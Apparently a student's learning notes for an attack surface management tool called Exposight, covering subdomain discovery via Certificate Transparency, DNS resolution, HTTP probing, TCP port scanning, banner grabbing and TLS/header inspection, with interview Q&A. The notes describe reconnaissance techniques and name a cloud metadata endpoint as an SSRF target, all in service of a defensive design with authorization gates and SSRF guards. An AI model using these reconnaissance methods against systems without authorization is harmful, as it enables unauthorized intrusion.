# Exposight - Learning Notes

These notes explain the architecture, design choices, and cybersecurity principles behind the implementation of **Exposight**.

---

# Part 1: v1 Step 1 — Project Setup + Passive Subdomain Discovery

## 1. Plain-English Code Walkthrough

### `pyproject.toml`
- **What it is:** The modern, declarative packaging configuration file for Python (PEP 517 / PEP 621).
- **Why it exists:** Replaces legacy `setup.py` scripts. It defines package metadata, build requirements (`setuptools`), core runtime dependencies (`httpx`, `dnspython`), development tools (`pytest`, `ruff`), and the CLI console script `asm` mapping directly to `asm.cli:main`.
- **Key aspects:** Allows installing the package in editable mode (`pip install -e ".[dev]"`), making the `asm` command immediately available in the active environment.

### `.gitignore`
- **What it is:** Git configuration that specifies intentionally untracked files.
- **Why it exists:** Prevents polluting the repository with virtual environments (`.venv/`), bytecode caches (`__pycache__/`, `.pytest_cache/`, `.ruff_cache/`), sensitive files (`.env`), and scan output artifacts (`output/`).

### `src/asm/validators.py`
- **What it is:** Domain normalization and RFC compliance validation engine.
- **Why it exists:** User input is untrusted and messy. A user might supply `http://EXAMPLE.COM:8080/path/to/page` when scanning a domain. Feeding raw paths or ports into DNS resolvers or Certificate Transparency APIs breaks queries or introduces command injection vulnerabilities.
- **Key Functions:**
  - `normalize_domain(raw_input: str) -> str`: Uses `urllib.parse.urlsplit` to safely strip schemes (`http://`, `https://`), userinfo, ports (`:8080`), URL paths (`/path`), query arguments, fragments, and trailing DNS root dots (`.`), while converting everything to lowercase. Detects IP addresses early so they are preserved for explicit rejection.
  - `validate_domain(raw_input: str) -> str`: Enforces DNS rules from RFC 1035/1123. Rejects IP addresses (via Python's `ipaddress` module), checks that total length is $\le 253$ characters, ensures labels are $1-63$ characters without hyphen prefixes/suffixes, verifies valid characters (`[a-z0-9-]`), and blocks numeric-only TLDs. Raises custom `DomainValidationError`.

### `src/asm/models.py` (Discovery Components)
- **What it is:** Strongly-typed data structures representing domain discovery states and scan artifacts.
- **Why it exists:** Using typed dataclasses instead of arbitrary dictionary keys prevents typos, enforces data schemas, and provides structured serialization.
- **Key Structures:**
  - `DNSStatus` (`StrEnum`): Canonical set of DNS resolution states: `RESOLVED`, `NXDOMAIN`, `NO_ANSWER`, `TIMEOUT`, `ERROR`.
  - `SubdomainResult` (`dataclass`): Represents a single host, its resolved IPv4/IPv6 addresses, resolution status, and a boolean `resolved` flag.
  - `DiscoveryReport` (`dataclass`): Represents the full output artifact, tracking the root domain, ISO 8601 UTC timestamps for audit trails, discovery source, statistical counts, and list of `SubdomainResult` entries.

### `src/asm/discovery.py`
- **What it is:** HTTP client for Certificate Transparency (CT) log querying via `crt.sh`.
- **Why it exists:** Queries the `crt.sh` public database to identify all TLS/SSL certificates ever issued for a domain and its subdomains.
- **Key Functions:**
  - `fetch_crtsh_data(domain: str, client: httpx.Client | None = None) -> list[dict]`: Queries `https://crt.sh` with parameters `q=%.<domain>&output=json` passed securely via `httpx` query params (preventing URL manipulation). Includes a student project User-Agent header, a 30s timeout, and exponential backoff retry logic (up to 3 attempts with 1s and 2s waits) for timeouts, connection drops, HTTP 429, HTTP 5xx, or malformed JSON responses. Non-retryable 4xx errors fail immediately. Raises `CrtshError` upon exhaustion.
  - `parse_subdomains(crtsh_entries: list[dict], target_domain: str) -> list[str]`: Inspects `name_value` fields from certificates. Handles multi-line strings, strips wildcard prefixes (`*.`), rejects email addresses and invalid hostnames, verifies the subdomain strictly belongs to `target_domain`, deduplicates, and sorts the list alphabetically.

### `src/asm/resolver.py`
- **What it is:** Multi-threaded DNS resolution engine utilizing `dnspython`.
- **Why it exists:** Having a list of subdomains from CT logs only tells you a certificate once existed; it does not indicate whether the host currently exists or is active. Resolving DNS records verifies live infrastructure.
- **Key Functions:**
  - `_query_record_type(resolver, hostname, record_type) -> tuple[list[str], DNSStatus]`: Performs an `A` (IPv4) or `AAAA` (IPv6) query with a 5.0s timeout. Catches `dns.resolver.NXDOMAIN`, `dns.resolver.NoAnswer`, `dns.resolver.NoNameservers` (mapped to `ERROR`), and `dns.exception.Timeout`.
  - `resolve_subdomain(hostname: str, ...) -> SubdomainResult`: Queries both `A` and `AAAA` records and combines them according to explicit precedence:
    1. Any IP found $\to$ `RESOLVED`
    2. Else if either returned `NXDOMAIN` $\to$ `NXDOMAIN`
    3. Else if either timed out $\to$ `TIMEOUT`
    4. Else if either had an unexpected error $\to$ `ERROR`
    5. Else $\to$ `NO_ANSWER`
  - `resolve_subdomains_concurrently(subdomains, max_workers=20) -> list[SubdomainResult]`: Distributes domain resolution over a thread pool of up to 20 workers, speeding up lookups by a factor of 10–20x without overloading local network sockets.

---

## 2. Five Step 1 Interview Questions & Answers

### Question 1: What is Certificate Transparency (CT), and why is it so valuable for Attack Surface Management?
**Answer:**
Certificate Transparency (RFC 6962) is an open framework designed to monitor and audit TLS/SSL certificates issued by Certificate Authorities (CAs). Whenever a CA issues a certificate for a domain, it submits the certificate to append-only, cryptographically verifiable public logs.

For Attack Surface Management (ASM) and passive reconnaissance, CT logs are an invaluable intelligence source because:
1. **Comprehensive Historical Record:** Any public or internal subdomain that ever obtained a public SSL/TLS certificate (e.g., `dev.example.com`, `vpn-test.internal.example.com`, `staging-api.example.com`) is permanently logged.
2. **Completely Passive:** Querying CT logs queries third-party log databases rather than the target organization's infrastructure. The target cannot observe or detect this reconnaissance activity.
3. **Discovery of "Shadow IT":** Developers and business units frequently spin up temporary subdomains and obtain free certificates. Even if unlinked on the main corporate website, CT logs reveal them immediately.

---

### Question 2: What is the fundamental difference between passive and active reconnaissance, and where does DNS resolution sit?
**Answer:**
- **Passive Reconnaissance:** Gathering intelligence about a target from publicly available third-party sources (e.g., Certificate Transparency logs, WHOIS databases, search engines, Shodan caches) without ever sending network packets to the target's servers.
- **Active Reconnaissance:** Directly sending packets to the target's infrastructure (e.g., port scanning with SYN packets, sending HTTP requests, vulnerability probing). Active scanning creates log entries on the target's firewalls, IDS/IPS, and web servers, and carries legal and operational risks if done without authorization.

**Where does DNS resolution sit?**
Standard recursive DNS resolution is generally considered **semi-passive or near-passive**. When querying a public DNS resolver (like `1.1.1.1` or `8.8.8.8`), your machine speaks to the caching resolver. If the record is cached, the target's authoritative nameservers are never contacted. If the record is not cached, the recursive resolver queries the target's authoritative nameserver on your behalf. However, because you are not connecting to the host's web ports or services, it does not constitute active host probing.

---

### Question 3: In DNS analysis, what is the practical security difference between `NXDOMAIN` and `NO_ANSWER`?
**Answer:**
- **`NXDOMAIN` (Non-Existent Domain):** The authoritative nameserver explicitly confirmed that the domain name itself does not exist in the DNS zone.
  - *Security Implication (Subdomain Takeover):* If a CT log reveals a subdomain that once pointed to a cloud provider (e.g. an AWS S3 bucket, Azure Traffic Manager, or GitHub Pages via a CNAME record) and that domain now yields `NXDOMAIN`, an attacker might register the unclaimed cloud resource or name to hijack the subdomain.
- **`NO_ANSWER` (NODATA):** The domain name exists in the DNS zone, but there are no records matching the requested type (e.g., no `A` or `AAAA` record exists, but an `MX`, `TXT`, or `CNAME` record might).
  - *Security Implication:* The host is registered and actively managed in the zone file, but might be reserved for email routing or identity verification rather than hosting an IPv4/IPv6 web service.

---

### Question 4: Why use a `ThreadPoolExecutor` for DNS resolution instead of standard sequential loops or asynchronous event loops like `asyncio`?
**Answer:**
1. **Network I/O Latency:** Sequential DNS lookups over hundreds of subdomains would incur cumulative network latency. Using concurrent threads drops total scan duration to approximately 1–2 seconds.
2. **Thread Pooling vs. Process Spawning:** Threads share the same memory space and have minimal OS creation overhead compared to processes (`multiprocessing`), which is ideal for lightweight, I/O-bound network calls.
3. **`dnspython` Synchronous Nature:** Standard `dnspython` is synchronous and blocking. Running blocking socket calls inside a Python `ThreadPoolExecutor` (with a sensible limit like 20 workers) provides high throughput without requiring complex asynchronous event loop plumbing.
4. **Controlled Concurrency:** Capping workers at 20 avoids flooding local DNS resolvers or triggering upstream rate-limiting/firewall drops.

---

### Question 5: Why must target domains be strictly normalized and validated before any reconnaissance, and what security risks are mitigated?
**Answer:**
Allowing raw, unsanitized user input into security tools introduces critical reliability and security flaws:
1. **SSRF and Unexpected Target Scoping:** If a user supplies an internal IP (e.g., `127.0.0.1`), querying external APIs or logging pipelines could lead to unintended target scanning.
2. **Command / Query Injection:** While our implementation uses parameterized requests, passing raw strings into external commands or unparameterized queries could lead to command injection.
3. **Denial of Service & Protocol Errors:** RFC 1035 limits domain names to 253 characters and labels to 63 characters. Passing invalid strings causes socket exceptions, broken HTTP query parameters, or unexpected application crashes.
4. **Data Consistency:** Normalizing `http://EXAMPLE.COM:8080/path` to `example.com` ensures that caching, report filenames, and deduplication keys remain deterministic and uniform across scans.

---

# Part 2: v1 Step 2 — Live Host Probing (HTTP/HTTPS)

## 1. Plain-English Code Walkthrough

### `src/asm/models.py` (Probe Extensions)
- **What it is:** Added dataclasses and enumerations for active probing results and reports.
- **Key Structures:**
  - `HostProbeStatus` (`StrEnum`): Host lifecycle states: `PROBED`, `SKIPPED_UNTRUSTED`, `SKIPPED_PRIVATE_IP`, `SKIPPED_UNRESOLVED`.
  - `ProbeErrorType` (`StrEnum`): Standardized error categories: `TIMEOUT`, `CONNECT_ERROR`, `TLS_ERROR`, `TOO_MANY_REDIRECTS`, `OTHER`.
  - `RedirectHop` (`dataclass`): Tracks each redirect URL, status code, and whether it was marked `out_of_scope`.
  - `UrlProbeResult` (`dataclass`): Captures reachability, HTTP status code, final URL, redirect chain, HTML `<title>`, response headers (`Server`, `X-Powered-By`, `Content-Type`), round-trip time in milliseconds, error classification, and certificate validity (`tls_valid`).
  - `HostProbeResult` (`dataclass`): Aggregates HTTPS and HTTP results for a subdomain, sets overall `live` status, and designates the `preferred_url`.
  - `ProbeReport` (`dataclass`): Root export artifact linking the original discovery report, UTC timestamps, counts (`hosts_probed`, `https_live`, `http_only`, `unreachable`, `tls_invalid`, `skipped_untrusted`, `skipped_private_ip`, `skipped_unresolved`), and detailed host results.

### `src/asm/prober.py`
- **What it is:** Active HTTP/HTTPS network prober with defensive controls.
- **Key Functions & Safety Mechanisms:**
  - `is_safe_public_ip(ip_str: str) -> bool`: Unwraps IPv4-mapped IPv6 addresses (e.g. `::ffff:127.0.0.1` -> `127.0.0.1`), then asserts `ip.is_global and not ip.is_multicast`. This blocks private RFC 1918 networks, loopback (`127.0.0.1`, `::1`), link-local (`169.254.0.0/16`), CGNAT (`100.64.0.0/10`), `0.0.0.0`, and multicast ranges.
  - `check_host_for_ssrf(hostname: str) -> tuple[bool, str | None]`: Resolves the host before any HTTP call. If any resolved IP is non-global/private, the host is skipped with `SKIPPED_PRIVATE_IP`. *(Documented: prevents internal network probing/SSRF; DNS rebinding protection will be added in v2).*
  - `is_redirect_in_scope(target_url: str, base_domain: str) -> bool`: Enforces that redirects must use `http` (port 80) or `https` (port 443), must match the target root domain or a subdomain, and cannot point to raw IP addresses or non-default ports like 8080.
  - `extract_title(html_bytes: bytes, content_type: str | None) -> str | None`: Parses the `<title>` tag only when `Content-Type` is `text/html`. Uses charset from headers (fallback `utf-8`), replaces invalid bytes, collapses internal whitespace, and caps length at 200 characters.
  - `_stream_and_read_body(response, deadline) -> bytes`: Streams the response body and caps reading at 64 KB (`65,536 bytes`), raising `DeadlineExceeded` if the clock passes the 10.0s URL deadline.
  - `is_tls_cert_verification_error(exc) -> bool`: Walks `__cause__` and `__context__` to detect real `ssl.SSLCertVerificationError` wrapped in `httpx.ConnectError`.
  - **Per-Client `verify=False` Retry**: When certificate verification fails, `tls_valid = False` is recorded, and a dedicated, isolated `httpx.Client(verify=False)` is used for one retry solely to test whether an HTTP service is responding behind the invalid certificate.
  - `probe_host(hostname, base_domain)`: Validates host syntax and scope, executes the SSRF pre-check, and uses an independent `httpx.Client` per thread to test HTTPS then HTTP.

### `src/asm/cli.py` (`handle_probe`)
- **What it is:** Added `asm probe <report_file> --authorized [-o DIR]` CLI command.
- **Key Workflow:**
  - **Authorization Gate**: Without `--authorized`, reads only the local report file to extract the domain, prints the mandatory warning message to stderr, and exits with code 1 without sending any network packets.
  - Validates report structure, filters for `RESOLVED` hosts, and tracks skipped unresolved hosts.
  - Concurrently probes hosts, writes a Windows-safe JSON report (`<domain>_probe_YYYYMMDDTHHMMSSZ.json`), and displays summary counts and live hosts.

---

## 2. Five Step 2 Cybersecurity Interview Questions & Answers

### Question 1: Why does active reconnaissance require explicit authorization, and what legal frameworks govern unauthorized probing?
**Answer:**
Unlike passive reconnaissance (which queries third-party logs like crt.sh or public DNS caches), active probing sends TCP connections and HTTP/HTTPS requests directly to the target organization's servers and firewalls.

Without explicit written authorization, active scanning can trigger security alerts, cause unintended service disruption, and violate computer crime laws:
1. **United States — Computer Fraud and Abuse Act (CFAA, 18 U.S.C. § 1030):** Prohibits intentionally accessing a protected computer without authorization or exceeding authorized access.
2. **United Kingdom — Computer Misuse Act 1990 (Section 1):** Criminalizes causing a computer to perform any function with intent to secure unauthorized access to programs or data.
3. **India — Information Technology Act, 2000:**
   - **Section 43 (Penalty and Compensation for damage to computer system):** Imposes civil liability and heavy financial penalties for accessing, securing access to, or downloading data from a computer system without permission of the owner.
   - **Section 66 (Computer Related Offenses):** Criminalizes fraudulent or dishonest acts under Section 43 (often termed hacking), punishable with imprisonment up to three years or fines up to ₹500,000 INR.

The `--authorized` flag serves as a deliberate safety gate ensuring the operator affirmatively asserts legal permission before any packets leave their system.

---

### Question 2: What is Server-Side Request Forgery (SSRF), and why must a reconnaissance tool strictly validate redirect targets?
**Answer:**
SSRF occurs when an attacker can coerce an application or scanner into making unintended HTTP requests to an arbitrary destination.

In active reconnaissance tools that automatically follow HTTP redirects:
- If a target subdomain (`sub.example.com`) redirects to an internal endpoint (e.g. `http://169.254.169.254/latest/meta-data/` on AWS/GCP, or `http://localhost:6379` for Redis), an unconstrained prober would follow the redirect, fetch sensitive cloud metadata or internal service banners, and potentially expose them in reports.
- Furthermore, an attacker-controlled server could redirect the tool to external targets or non-default internal ports (`http://sub.example.com:8080/`), turning the scanner into an unwitting proxy or denial-of-service tool.

**How we mitigate this:**
1. We follow redirects **manually** rather than automatically.
2. We validate that every redirect target strictly matches the root domain or authorized subdomains.
3. We enforce that redirects only use HTTP (port 80) or HTTPS (port 443).
4. If a redirect points out-of-scope or to an IP address, we record the hop with `out_of_scope = True`, mark the host as reachable, and stop following immediately.

---

### Question 3: Why should an attack surface management tool distinguish between TLS validity and service reachability?
**Answer:**
In production environments, subdomains frequently host services with expired certificates, self-signed certificates, or certificates with name mismatches (e.g., development, staging, or internal microservices exposed to the internet).

If a security scanner aborts immediately upon encountering a certificate error:
1. It completely misses the service running behind that port, leaving shadow IT and unpatched web applications invisible to defenders.
2. It fails to report the certificate issue itself, which is a major security flaw (rendering communications vulnerable to Man-in-the-Middle attacks).

**Our dual approach:**
We first attempt a strict TLS handshake (`verify=True`). If verification fails (detecting `ssl.SSLCertVerificationError`), we explicitly record `tls_valid = False` to document the certificate vulnerability. We then instantiate a separate client with `verify=False` solely to test if an HTTP service responds, allowing us to capture the page title, web server banner, and status code for comprehensive asset visibility.

---

### Question 4: Why enforce a 64 KB response streaming cap and an overall 10-second URL deadline during reconnaissance?
**Answer:**
Reconnaissance tools must be defensive and resilient against defensive countermeasures and resource exhaustion attacks:
1. **Decompression & Download Bombs:** Web servers can return multi-gigabyte ISOs, video files, or compressed "zip/gzip bombs" (e.g., small downloaded streams that expand to gigabytes or never terminate). Downloading full bodies would saturate the scanner's bandwidth and exhaust system memory.
2. **Reconnaissance Goal:** For asset discovery and service identification, only the HTTP headers, status code, and HTML `<title>` tag are necessary. The `<title>` almost always resides within the initial few kilobytes of the HTML `<head>` section. Reading at most 64 KB guarantees we capture the title while bounding memory consumption.
3. **Slowloris & Tarpit Defense:** A defensive host or misconfigured server might drip bytes at a rate of 1 byte per second to keep scanner threads tied up indefinitely. Enforcing a hard 10.0-second end-to-end deadline per URL (using high-resolution monotonic clocks) guarantees threads terminate promptly.

---

### Question 5: What is the purpose of pre-probe IP resolution and IPv4-mapped IPv6 unwrapping, and what is DNS Rebinding?
**Answer:**
**Pre-Probe IP Resolution & IPv4-Mapped IPv6:**
Before sending any HTTP packets to a resolved host, `asm probe` resolves the host's IP addresses and inspects them using Python's `ipaddress` module.
- Many systems support dual-stack IPv4-mapped IPv6 addresses (format `::ffff:127.0.0.1` or `::ffff:10.0.0.1`). If evaluated solely as IPv6 without unwrapping, some naive filters misidentify them as public IPv6 addresses. We unwrap `ip.ipv4_mapped` first, and ensure `ip.is_global and not ip.is_multicast`. This blocks RFC 1918, CGNAT (`100.64.0.0/10`), link-local, loopback, and broadcast ranges from being probed.

**What is DNS Rebinding?**
DNS Rebinding is an attack where an attacker controls an authoritative nameserver for a domain. When our tool resolves the domain during the pre-check, the nameserver returns a legitimate public IP address (passing the SSRF filter). However, when the HTTP client subsequently resolves the host to establish a socket connection milliseconds later, the nameserver returns an internal IP address (such as `127.0.0.1` or `169.254.169.254`).

*Future Mitigation (v2):* Connecting directly to the pre-verified IP address via an explicit IP socket while passing the hostname in the `Host` header and TLS SNI extension completely prevents DNS rebinding.

---

# Part 3: v1 Step 3 — Lightweight TCP Port Scanning

## 1. Plain-English Code Walkthrough

### `src/asm/scan_common.py`
- **What it is:** Centralized security module containing shared input validation, report loading, and SSRF defense primitives.
- **Why it exists:** Both `prober.py` (HTTP probing) and `portscan.py` (TCP scanning) require identical security checks: treating the input report as untrusted data, re-validating domain syntax/scope, unwrapping IPv4-mapped IPv6 addresses, and blocking internal network ranges. Centralizing this prevents "security drift" between modules.
- **Key Functions:**
  - `load_and_validate_report(report_path)`: Opens JSON report, verifies `domain` and `results`, filters hosts with `status == "RESOLVED"`, and counts skipped unresolved hosts. Raises `ReportValidationError`.
  - `is_safe_public_ip(ip_str)`: Unwraps `ip.ipv4_mapped` and asserts `ip.is_global and not ip.is_multicast`.
  - `check_host_for_ssrf(hostname)`: Resolves host records and blocks private/loopback/CGNAT addresses.
  - `validate_host_and_scope(hostname, base_domain)`: Ensures the hostname passes strict RFC 1035 syntax validation and belongs to the authorized domain scope.

### `src/asm/portscan.py`
- **What it is:** Asynchronous TCP connect port scanner and banner grabber built with Python's standard library `asyncio`.
- **Key Functions & Safety Controls:**
  - `DEFAULT_PORTS`: Fixed list of 16 common ports (`21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443`). Never scans any port outside this set.
  - `compute_risk_flags(port)`: Flags high-risk exposures: `DATABASE_EXPOSURE` (3306, 5432, 6379), `RDP_EXPOSURE` (3389), `SMB_EXPOSURE` (445), `TELNET_INSECURE_REMOTE_ACCESS` (23), and `PLAINTEXT_PROTOCOL` (strictly limited to 21, 23, 25, 110, 143; never flags 80, 8080, 443, 8443, or 22).
  - `grab_banner(reader, writer, port)`: Safely captures service greetings with a 2s timeout and 256-byte limit. For SSH (`port 22`), it listens passively without sending bytes (avoiding handshake breakage). For ports 21, 25, 110, 143, it sends a single `\r\n` CRLF prompt. For all other ports, it listens passively.
  - `sanitize_banner(raw_bytes)`: Strips non-printable ASCII control characters, collapses whitespace, and truncates to 256 characters.
  - `scan_single_port(host, port, port_semaphore)`: Executes `asyncio.wait_for(asyncio.open_connection(host, port), timeout=3.0)`.
    - **Strict Connection Validation:** A port is classified as `OPEN` *only* if `asyncio.open_connection` succeeds with valid reader/writer streams, `writer.is_closing()` is False, socket fileno != -1, and `reader.at_eof()` is False (not closed prematurely).
    - **Error Mapping:** `TimeoutError` strictly maps to `FILTERED`. `ConnectionRefusedError` (and Windows `WSAECONNREFUSED` / 10061) strictly maps to `CLOSED`. `OSError` (network unreachable / host down) and any unexpected exceptions strictly map to `FILTERED` (never `OPEN` on error).
  - `scan_host_ports(hostname, base_domain, ...)`: Validates host scope, performs DNS resolution at scan time (marking `SKIPPED_UNRESOLVED` if DNS fails so one bad host never aborts the scan), runs the SSRF check, and scans ports concurrently.
  - Concurrency limiting: Max 10 ports in parallel per host (`port_semaphore`), max 5 hosts in parallel (`host_semaphore`), with a polite delay between connections.

### `tests/test_integration_portscan.py`
- **What it is:** Real-network integration test against `scanme.nmap.org`.
- **Safety & Isolation:** Decorated with `@pytest.mark.integration` and deselected by default in CI and standard test runs via `addopts = "-v --strict-markers -m 'not integration'"` in `pyproject.toml`.
- **Purpose:** Verifies live socket classification: confirms that dropped/firewalled ports (such as 8080 and 8443 on `scanme.nmap.org`) return `FILTERED`, while actual listening ports return `OPEN`.

### `src/asm/models.py` (Port Scan Extensions)
- Added `PortStatus` (`StrEnum`: `OPEN`, `CLOSED`, `FILTERED`).
- Added `PortResult` (`dataclass`): Port number, state, guessed service, banner, risk flags, and response time.
- Added `HostPortScanResult` (`dataclass`): Per-host breakdown of open, closed, and filtered ports with host-level risk tags.
- Added `PortScanReport` (`dataclass`): Top-level export schema for port scan reports.

### `src/asm/cli.py` (`handle_portscan` and Quiet Logging)
- Added `asm portscan <report.json> --authorized [-o DIR] [-v]`.
- Enforces the `--authorized` gate before connecting to any sockets.
- **Logging Fix**: Silences third-party and standard library debug logs (`httpx`, `httpcore`, `asyncio`) unless `-v` is explicitly passed, keeping default output clean.

---

## 2. Five Step 3 Cybersecurity Interview Questions & Answers

### Question 1: What is the technical and practical difference between a TCP Connect scan and a SYN "Stealth" scan?
**Answer:**
- **TCP Connect Scan (`-sT` in Nmap / `asyncio.open_connection` in Python):**
  - Uses the operating system's standard network API (`connect()` system call) to complete the full three-way TCP handshake (`SYN -> SYN-ACK -> ACK`). Once connected, the application closes the socket (`FIN` or `RST`).
  - *Advantages:* Runs entirely in user-space with standard unprivileged user accounts; requires no raw socket privileges or special kernel drivers (e.g. WinPcap/Npcap on Windows); cross-platform and reliable.
  - *Disadvantages:* Slower than SYN scanning; readily logged by application-layer server logs as established connections.
- **TCP SYN "Stealth" Scan (`-sS` in Nmap):**
  - Sends a raw `SYN` packet. If the target responds with `SYN-ACK` (port open), the scanner immediately sends a `RST` packet to tear down the connection before the three-way handshake completes.
  - *Advantages:* Faster; historically bypassed basic application-layer logging (though modern stateful firewalls and IDS/IPS detect SYN scans easily).
  - *Disadvantages:* Requires raw socket creation (`SOCK_RAW`), which mandates Administrator/root privileges and custom packet crafting.

---

### Question 2: In TCP port scanning, what is the operational distinction between `CLOSED` and `FILTERED`?
**Answer:**
- **`CLOSED`:**
  - The target host is online and received the TCP `SYN` packet, but no service is listening on that port. The target's operating system kernel immediately generates an active TCP `RST` (Reset) packet (or `RST-ACK`) and sends it back to the scanner.
  - *Security Insight:* Proves that the host is alive, responsive, and routing traffic, and that there is no intermediate firewall silently discarding packets on that port.
- **`FILTERED`:**
  - The scanner sent a TCP `SYN` packet, but received no response within the timeout window (or received an ICMP Type 3 "Destination Unreachable / Communication Administratively Prohibited" error).
  - *Security Insight:* Indicates that a stateful firewall, packet filter, or cloud security group (e.g. AWS Security Group or iptables) is silently dropping packets before they reach the target operating system.

---

### Question 3: Why should an Attack Surface Management (ASM) tool scan a fixed list of common ports rather than the full 1–65,535 range?
**Answer:**
1. **Pareto Principle (80/20 Rule):** Over 95% of exposed enterprise assets, misconfigurations, and external attack vectors reside on a small cluster of well-known ports (HTTP/HTTPS, SSH, RDP, SMB, standard databases). A curated 16-port scan detects the vast majority of critical vulnerabilities.
2. **Speed & Efficiency:** Scanning 65,535 ports per host across hundreds of subdomains would take hours or days per scan and consume massive network bandwidth. A 16-port scan takes under 5 seconds per host.
3. **IDS/IPS & Abuse Evasion:** Sweeping full port ranges triggers threshold-based Intrusion Detection/Prevention Systems (IDS/IPS), causes defensive firewalls to blacklist the scanner's IP, and generates automated abuse complaints from ISPs and hosting providers.
4. **Targeted Risk Identification:** Scanning ports like 3389 (RDP) or 445 (SMB) immediately identifies critical exposures without generating unnecessary network noise.

---

### Question 4: What are the operational risks of banner grabbing, and why must protocols like SSH (port 22) be treated differently from SMTP or FTP?
**Answer:**
- **Crash Risks on Fragile Services:** Sending random binary payloads, generic HTTP requests, or malformed data to proprietary or legacy network daemons (e.g. SCADA/ICS devices, medical equipment, or older print servers) can trigger buffer overflows, unhandled socket exceptions, or denial-of-service crashes.
- **Protocol Etiquette (SSH vs. Prompt Protocols):**
  - **SSH (Port 22):** The SSH protocol specification (RFC 4253) states that upon TCP connection, the **server speaks first** by sending its protocol identification string (e.g., `SSH-2.0-OpenSSH_8.9p1`). If a scanner immediately sends bytes before reading the server's identification, the SSH daemon considers it a protocol violation and closes the connection.
  - **Banner Protocols (FTP 21, SMTP 25, POP3 110, IMAP 143):** These protocols often wait for a client prompt or greeting. Sending a single `\r\n` CRLF cleanly prompts the server to return its standard welcome banner without sending dangerous fuzzing payloads.

---

### Question 5: Why is centralizing shared security controls (SSRF guards and domain validation) into `scan_common.py` an essential software architecture pattern?
**Answer:**
1. **Prevention of Security Drift:** In multi-stage security tools (Discovery -> HTTP Probing -> Port Scanning -> Vulnerability Assessment), each stage performs network I/O. If validation logic is duplicated across separate files, improvements or bug fixes made in one scanner (e.g. discovering a bypass in IPv4-mapped IPv6 address parsing) might not be applied to other stages, leaving gaps.
2. **Consistent Policy Enforcement:** Centralizing functions like `load_and_validate_report`, `is_safe_public_ip`, and `validate_host_and_scope` ensures that all active modules adhere strictly to the exact same authorization boundaries, private IP filters, and error handling rules.
3. **Testability & Auditability:** Having a single, dedicated module with unit tests proves that core security boundaries are tested and verified independently of protocol-specific networking logic.

---

# Part 4: TLS Certificate Inspection & HTTP Security Headers

## 1. Plain-English Architecture Walkthrough

### `src/asm/tls_inspect.py`
- **What it is:** Pure standard library TLS certificate inspector and evaluator.
- **Two-Pass Public API Verification Strategy:**
  - **Pass 1 (Verified):** Uses `ssl.create_default_context()` to connect to `host:443`. If the certificate chain validates successfully against the operating system's trusted root CA store, `is_trusted = True` and the parsed certificate dictionary is read via `sslsock.getpeercert()`.
  - **Pass 2 (Unverified Fallback):** If verification fails (e.g. expired, self-signed, invalid CA chain), an unverified context is created using public standard library API (`ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE`). This allows the TLS handshake to complete, records `is_trusted = False`, captures the exact verification error (`verify_error`), and extracts negotiated TLS protocol version and key flags.
- **Key Functions & Logic:**
  - `matches_hostname(hostname, sans, common_name)`: Implements RFC 6125 wildcard matching. Prioritizes Subject Alternative Names (SANs) over Common Name (CN). Ensures single-level wildcards (`*.example.com`) only match single subdomains (`api.example.com`) and never multi-level domains (`a.b.example.com`) or the apex domain (`example.com`).
  - `parse_cert_dict(cert_dict, ...)`: Converts `getpeercert()` output into `CertInfo`. Parses validity dates into ISO 8601 UTC via `ssl.cert_time_to_seconds`, calculates exact `days_until_expiry`, and evaluates security flags.
  - Flags: `expired` (now past notAfter), `not_yet_valid` (now before notBefore), `issuer_equals_subject` (likely self-signed), `hostname_mismatch`, `expiring_soon` (30 days or fewer remaining), and `deprecated_tls` (TLS 1.0 or 1.1).

### Note on Weak Signature Algorithm Detection
- **Why `weak_sig` is omitted in v1:** Python's standard library `ssl.getpeercert()` decodes X.509 certificates using OpenSSL's internal C routines but intentionally omits the certificate signature algorithm OID from its returned dictionary. Hand-parsing binary DER/ASN.1 structures in the standard library without external libraries is fragile and error-prone across different X.509 extensions.
- **Production Standard:** In enterprise Attack Surface Management tools, comprehensive certificate parsing (including signature algorithms like MD5/SHA-1 and full certificate chains) is performed using the dedicated `cryptography` library (`cryptography.x509`).

### `src/asm/headers_inspect.py`
- **What it is:** HTTP security header evaluator and single-connection TLS coordinator.
- **Single-Connection Preference:**
  - Performs an HTTPS GET to `https://<host>/` using `httpx.Client(verify=True)`.
  - Evaluates HTTP response headers directly.
  - Reuses the active TLS connection by reading `response.extensions.get("network_stream").get_extra_info("ssl_object")` to extract certificate data in the exact same TCP round-trip.
  - **Robust Fallback:** If the stream is closed, `ssl_object` is None, or `getpeercert()` returns an empty dictionary, the coordinator falls back to a direct `ssl+socket` connection to `host:443`, recording whether the cert was obtained `from_response` or `from_socket`.
- **Security Header Analysis:**
  - Monitored Headers: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`.
  - HSTS Parsing: Extracts `max-age` in seconds. Flags `hsts_weak = True` if `max-age < 15552000` (180 days).
  - Information Disclosure: Checks for `Server`, `X-Powered-By`, and `X-AspNet-Version` headers that leak server software and backend runtime versions to attackers.

### `src/asm/models.py` (Inspection Extensions)
- Added `CertInfo` (`dataclass`): Certificate metadata and boolean flags.
- Added `HeaderInfo` (`dataclass`): Present/missing headers, HSTS max-age, and disclosure flags.
- Added `HostInspectResult` (`dataclass`): Combined per-host inspection result.
- Added `InspectReport` (`dataclass`): Top-level export schema for inspect reports.

### `src/asm/cli.py` (`handle_inspect`)
- Added `asm inspect <probe_report.json> --authorized [-o DIR] [-v]`.
- Enforces the `--authorized` gate before initiating any network inspection.
- Filters probe results to inspect only hosts that were verified reachable over HTTPS in Step 2 (`SKIPPED_NOT_HTTPS`).
- Displays a clean CLI summary and exports the JSON report.

---

## 2. Five Step 4 Cybersecurity Interview Questions & Answers

### Question 1: What does a TLS certificate actually prove, and what do certificate expiry, self-signing, and hostname mismatch indicate for an organization's attack surface?
**Answer:**
- **What a TLS Certificate Proves:** A TLS certificate cryptographically binds a public key to an identity (a domain name). When signed by a trusted Certificate Authority (CA) in the client's trust store, it proves two things: (1) **Authentication** (the client is speaking to the legitimate owner of the domain) and (2) **Confidentiality/Integrity** (enables symmetric session key exchange so network traffic cannot be eavesdropped on or tampered with).
- **Attack Surface Implications:**
  - **Expired Certificate:** Indicates poor asset management, broken automated certificate lifecycle management (e.g. Certbot/ACME failure), and immediately causes browser security warnings that destroy user trust or break API integrations.
